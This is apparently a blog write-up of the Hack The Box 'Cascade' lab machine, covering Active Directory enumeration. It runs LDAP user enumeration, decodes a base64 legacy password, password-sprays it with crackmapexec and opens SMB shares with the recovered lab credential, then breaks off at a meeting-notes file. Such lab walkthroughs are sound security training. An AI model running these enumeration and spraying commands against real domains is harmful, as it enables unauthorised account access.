---
title: "Writeup: Cascade from Hack The Box"
author: Asier Núñez
pubDatetime: 2025-01-08T19:51:29.606Z
slug: cascade-writeup
featured: false
draft: false
tags:
  - Windows
  - Active Directory
  - Security
  - Ethical Hacking
  - GPP
  - SPN
  - Hashcat
  - TGT
description: "Writeup for the Cascade machine from Hack The Box, a Windows Active Directory"
---

# Enumeration

Domain: CASCADE.LOCAL
CN: CASC-DC01

After trying to enumerate with anonymous and guest users via SMB and not getting any results, we can try to use `windapsearch` to enumerate users.

```bash
./windapsearch-linux-amd64 -d cascade.local --dc 10.129.92.161 -m users
```

This will give us a list of users and their attributes. We can create a list of users with the following command:

```bash
./windapsearch-linux-amd64 -d cascade.local --dc 10.129.92.161 -m users | grep sAMA | awk '{print $2}' > users
```

If we take a look at the information obtaied via LDAP, we can see that `Ryan Thompson` has a legacy password set.

![LegacyPassword](@assets/images/writeups/htb/cascade/legacypass.png)

This password is encoded using base64, so we can decode it to get the plaintext password.

![LegacyPass-Decode](@assets/images/writeups/htb/cascade/legacypass-decode.png)

```
r.thompson:rY4n5eva
```

We can use crackmapexec to spray the password over the users to validate if it belong to Ryan or any other user.

```bash
crackmapexec smb 10.129.92.161 -u users -p 'rY4n5eva' --continue-on-success
```

![Pass-Spray](@assets/images/writeups/htb/cascade/pass-spray.png)

Now we can access the SMB shares with the credentials of Ryan.

```bash
crackmapexec smb 10.129.92.161 -u r.thompson -p 'rY4n5eva' --shares
```

![CME-Shares](@assets/images/writeups/htb/cascade/cme-shares.png)

```bash
smbclient \\\\10.129.92.161\\DATA -U r.thompson
```

![SMB-Data](@assets/images/writeups/htb/cascade/smb-data.png)

If we open the DATA share, we can find a file called `Meeting_Notes_June_2018.html`.

![SMB-Email](@assets/images/writeups/htb/cascade/smb-email.png)
